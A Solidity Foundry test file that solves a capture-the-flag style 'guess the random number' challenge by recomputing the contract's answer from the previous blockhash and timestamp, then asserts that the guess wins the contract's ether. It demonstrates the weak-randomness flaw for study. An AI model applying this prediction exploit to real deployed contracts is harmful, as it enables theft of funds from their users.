
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockNumber > 1);
        vm.assume(blockTimestamp > 0);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        uint8 predictedAnswer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        uint256 initialBalance = address(this).balance;

        challenge.guess{value: 1 ether}(predictedAnswer);

        assertGt(address(this).balance, initialBalance);
        assertTrue(challenge.isComplete());
    }
}
